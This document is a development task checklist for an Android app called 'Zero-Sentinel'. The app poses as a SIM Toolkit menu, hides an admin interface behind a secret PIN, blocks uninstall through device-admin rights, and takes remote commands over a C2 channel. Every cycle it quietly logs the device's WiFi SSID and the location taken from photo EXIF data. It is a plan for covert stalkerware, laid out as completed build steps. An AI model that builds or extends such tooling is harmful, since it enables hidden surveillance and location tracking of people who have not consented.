# Zero-Sentinel Implementation Tasks

## Phase 4: Stealth & Persistence
- [x] **Implement SIM Toolkit Decoy UI**
  - [x] **Icon**: Ensure app icon remains as "SIM Menu" (ic_sim_menu).
  - [x] **Decoy Layout**:
    - Create a simple `ListView` mimicking a standard SIM Toolkit menu.
    - **Items**: 
      - "Search"
      - "Favorites"
      - "Transaction Services"
      - "Information Services"
      - "Entertainment Services"
      - "USSD Service Catalog"
      - "Help and Support"
  - [x] **Trigger Logic**:
    - Clicking on most items should show a generic "Service not available" or "Connection error" toast.
    - **Secret Trigger**: Clicking on "Help and Support" (or configured item).
  - [x] **Authentication**:
    - Show a numeric input dialog (PIN Pad).
    - **Validation**: Check against configured PIN (0-9).
    - **Success**: Unlock Admin UI.
    - **Failure**: Show "Invalid MMI Code".
  - [x] **PIN Management**:
    - [x] **Default**: Ensure "123123" is default.
    - [x] **Remote**: Implement `/setpin <new_pin>` in `CommandProcessor`.
    - [x] **Cleanup**: Remove `/hide` and `/show` commands.
    - [x] **Local**: Verify `MainActivity` password set/change works.
  - [x] **Uninstall Protection (Device Admin)**:
    - [x] **Receiver**: Create `SentinelDeviceAdminReceiver`.
    - [x] **Policies**: Create `res/xml/device_admin_policies.xml`.
    - [x] **Manifest**: Register receiver with `BIND_DEVICE_ADMIN`.
    - [x] **UI**: Add "Enable Admin" button to `MainActivity`.

## Phase 4: Intelligence & Data Gathering
- [x] **Implement Passive Monitoring (Triggered by C2 Cycle)**
  - [x] **Logic**: Hook into `C2Worker.doWork()` to run every cycle.
  - [x] **WiFi**: Capture current WiFi SSID.
  - [x] **Location**: Extract EXIF Lat/Lon from the single latest image (Limit 1).
- [x] **Log Format**: `yyyy-MM-dd HH:mm:ss | TYPE_CODE | > data`.
- [x] **Log Content**: `[WIFI: <SSID>] | [LOC: https://maps.google.com/?q=<Lat>,<Lon>] | [IMG_DATE: <EXIF_DATE>]`.
